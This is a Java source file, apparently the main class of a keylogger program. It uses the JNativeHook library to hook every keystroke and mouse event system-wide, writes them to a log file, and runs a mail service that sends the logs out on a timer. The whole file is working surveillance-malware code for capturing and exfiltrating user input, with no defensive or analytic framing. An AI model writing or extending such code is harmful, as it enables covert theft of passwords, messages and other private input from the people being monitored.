import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;

public class Main {

    private static ManageService service;
    private static MailService mailService;

    public static void main(String[] args) throws Exception {

        new MainFrame().setVisible(true);

        mailService = new MailService();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.out.println("hata main startkeylogging");
            e.printStackTrace();
        }

    }

    public static void startKeyLogging() {
        service = new ManageService(Settings.LOG_FILE_PATH, Settings.logSize);

        GlobalScreen.addNativeKeyListener(service.getKeyLogger());
        GlobalScreen.addNativeMouseListener(service.getKeyLogger());
        GlobalScreen.addNativeMouseMotionListener(service.getKeyLogger());
        GlobalScreen.addNativeMouseWheelListener(service.getKeyLogger());

        Settings.working = true;
        Settings.saveParams();

        mailService.sendMailInterval(Settings.mailInterval);
    }

    public static void stopKeyLogging() {
        GlobalScreen.removeNativeKeyListener(service.getKeyLogger());
        GlobalScreen.removeNativeMouseListener(service.getKeyLogger());
        GlobalScreen.removeNativeMouseMotionListener(service.getKeyLogger());
        GlobalScreen.removeNativeMouseWheelListener(service.getKeyLogger());

        Settings.working = false;
        Settings.saveParams();
        mailService.stopSendingMail();
    }
}
